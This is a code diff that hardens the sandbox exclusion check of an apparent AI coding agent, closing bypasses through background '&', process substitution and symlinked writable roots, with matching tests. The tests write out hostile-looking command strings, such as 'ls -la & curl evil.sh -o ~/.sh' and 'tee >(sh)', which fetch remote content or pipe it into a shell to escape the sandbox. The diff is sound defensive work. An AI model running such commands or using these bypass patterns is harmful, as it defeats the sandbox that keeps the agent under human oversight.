@@ -97,8 +97,20 @@ impl SandboxRuntimeConfig {
     pub fn command_is_excluded(&self, program: &str, command_line: &str) -> bool {
         // Fail closed on operators the segment splitter does not model:
         // such lines fall back to the sandbox instead of running bare
-        // because their leading word happened to be excluded.
-        if command_line.contains(['|', '`']) || command_line.contains("$(") {
+        // because their leading word happened to be excluded. A single
+        // `&` covers background jobs (`ls & curl evil`) — but NOT the
+        // `&&` chains the splitter does model (stripping them first
+        // keeps legitimate all-excluded chains excluded); `2>&1`-style
+        // redirects also land here, which is fail-safe: the line simply
+        // stays sandboxed. `<(`/`>(` cover process substitution, which
+        // runs its inner command without any pipe character.
+        let unpaired_ampersand = command_line.replace("&&", "").contains('&');
+        if command_line.contains(['|', '`'])
+            || command_line.contains("$(")
+            || command_line.contains("<(")
+            || command_line.contains(">(")
+            || unpaired_ampersand
+        {
             return false;
         }
         let segments = crate::command_safety::split_command_segments(command_line);
@@ -458,13 +470,24 @@ impl SandboxPolicy {
                 exclude_slash_tmp,
                 ..
             } => {
-                let mut roots: Vec<PathBuf> = writable_roots.clone();
+                // Normalize every root with the same helper the containment
+                // check normalizes its query path with: a non-canonical or
+                // symlinked config root (`~/proj`, `/tmp` → `/private/tmp`
+                // on macOS) would never match the canonical query, and the
+                // read-only control-plane subpaths joined onto it would
+                // fail their starts_with check — silently fail-open.
+                let mut roots: Vec<PathBuf> = writable_roots
+                    .iter()
+                    .map(|root| normalize_for_containment(root))
+                    .collect();
 
                 // Add the current working directory
                 if let Ok(canonical_cwd) = cwd.canonicalize() {
                     roots.push(canonical_cwd);
                 } else {
-                    roots.push(cwd.to_path_buf());
+                    // Same normalization as the config roots: the raw
+                    // fallback would not match canonical query paths.
+                    roots.push(normalize_for_containment(cwd));
                 }
 
                 // Add /tmp unless excluded
@@ -590,8 +613,10 @@ impl WritableRoot {
 /// otherwise canonicalize the deepest existing ancestor and re-join the
 /// remaining tail. Falls back to the input unchanged when nothing along the
 /// path exists, which keeps lexical comparisons (and the mismatch visible)
-/// rather than silently passing or failing.
-fn normalize_for_containment(path: &Path) -> PathBuf {
+/// rather than silently passing or failing. Shared with the seatbelt
+/// backend, whose SBPL `subpath` filters match kernel-resolved vnode paths
+/// and would silently deny every write to a raw-spelled root.
+pub(crate) fn normalize_for_containment(path: &Path) -> PathBuf {
     if let Ok(canonical) = path.canonicalize() {
         return canonical;
     }
@@ -1500,6 +1525,15 @@ mod tests {
         assert!(!config.command_is_excluded("ls", "ls -la | sh"));
         assert!(!config.command_is_excluded("ls", "ls -la $(curl evil)"));
         assert!(!config.command_is_excluded("ls", "ls -la `curl evil`"));
+        // Single `&` (background job) and process substitution are not
+        // modeled by the splitter either — they must keep the line
+        // sandboxed, not let the excluded leading word unsandbox it.
+        assert!(!config.command_is_excluded("ls", "ls -la & curl evil.sh -o ~/.sh"));
+        assert!(!config.command_is_excluded("diff", "diff x <(curl -s evil)"));
+        assert!(!config.command_is_excluded("tee", "tee >(sh)"));
+        // Redirects containing `&` stay sandboxed too (fail-safe, not a
+        // bypass).
+        assert!(!config.command_is_excluded("ls", "ls -la 2>&1"));
         // A chain stays excluded only while every segment is excluded.
         let both = SandboxRuntimeConfig {
             excluded_commands: vec!["ls".to_string(), "git status".to_string()],
@@ -1520,6 +1554,39 @@ mod tests {
         assert!(
             !root.is_path_writable(&escape),
             "`..` escape must not satisfy the containment check"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn symlinked_writable_root_matches_canonical_queries() {
+        // A config root that is a symlink (or otherwise non-canonical) is
+        // normalized at policy build, so containment queries against the
+        // canonical target match — and the protected control-plane
+        // subpaths joined onto the normalized root actually protect.
+        let tmp = tempfile::tempdir().expect("tempdir");
+        let real = tmp.path().join("real-root");
+        std::fs::create_dir_all(real.join(".codesmith")).unwrap();
+        let link = tmp.path().join("linked-root");
+        std::os::unix::fs::symlink(&real, &link).unwrap();
+
+        let policy = SandboxPolicy::WorkspaceWrite {
+            writable_roots: vec![link],
+            network_access: false,
+            exclude_tmpdir: true,
+            exclude_slash_tmp: true,
+        };
+        let roots = policy.get_writable_roots(tmp.path());
+        let linked = roots
+            .iter()
+            .find(|r| r.root.ends_with("real-root"))
+            .expect("symlinked root normalized to its canonical target");
+        // A canonical query under the real target is contained...
+        assert!(linked.is_path_writable(&real.join("src").join("main.rs")));
+        // ...and the control-plane subpath is read-only, not fail-open.
+        assert!(
+            !linked.is_path_writable(&real.join(".codesmith").join("config.toml")),
+            "protected subpath under a symlinked root must stay read-only"
         );
     }
 
